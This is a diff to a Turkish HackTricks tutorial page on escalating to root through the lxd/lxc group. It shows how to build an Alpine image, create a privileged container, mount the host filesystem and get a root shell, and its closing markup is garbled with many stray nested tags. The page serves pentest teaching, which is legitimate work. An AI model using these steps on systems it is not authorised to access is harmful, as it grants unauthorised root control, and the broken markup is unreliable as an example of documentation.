@@ -1,8 +1,8 @@
 # lxd/lxc Grubu - Yetki Yükseltme
 
 {% hint style="success" %}
-AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -14,56 +14,39 @@ GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt
 
 </details>
 {% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 
-_eğer_ **lxd** _veya_ **lxc** _grubuna ait iseniz, root olabilirsiniz_
+_Eğer_ **lxd** _veya_ **lxc** _grubuna ait iseniz, root olabilirsiniz._
 
 ## İnternetsiz Sömürü
 
 ### Yöntem 1
 
-Bu dağıtım oluşturucusunu makinenize kurabilirsiniz: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(github talimatlarını takip edin):
+Bu dağıtım oluşturucusunu makinenize kurabilirsiniz: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder) (github talimatlarını takip edin):
 ```bash
 sudo su
-#Install requirements
+# Install requirements
 sudo apt update
 sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
-#Clone repo
+
+# Clone repo
 git clone https://github.com/lxc/distrobuilder
-#Make distrobuilder
+
+# Make distrobuilder
 cd distrobuilder
 make
-#Prepare the creation of alpine
+
+# Prepare the creation of alpine
 mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
-#Create the container
+
+# Create the container
+## Using build-lxd
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
+## Using build-lxc
+sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
 ```
-Dosyaları **lxd.tar.xz** ve **rootfs.squashfs** yükleyin, resmi depoya ekleyin ve bir konteyner oluşturun:
+Dosyaları **lxd.tar.xz** ve **rootfs.squashfs** yükleyin, görüntüyü depoya ekleyin ve bir konteyner oluşturun:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -80,7 +63,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 {% hint style="danger" %}
 Eğer bu hatayı bulursanız _**Hata: Depo havuzu bulunamadı. Lütfen yeni bir depo havuzu oluşturun**_\
-**`lxd init`** komutunu çalıştırın ve **önceki** komut grubunu **tekrarlayın**
+**`lxd init`** komutunu çalıştırın ve **önceki** komut grubunu **tekrar** edin
 {% endhint %}
 
 Sonunda konteyneri çalıştırabilir ve root alabilirsiniz:
@@ -111,7 +94,8 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 
-{% hint style="success" %}
+<div data-gb-custom-block data-tag="hint" data-style='success'>
+
 Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
@@ -124,52 +108,103 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
-{% endhint %}
+</div>
+
 </details>
-{% endhint %}
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</div>
+
+</details>
+
+</div>
+```
+
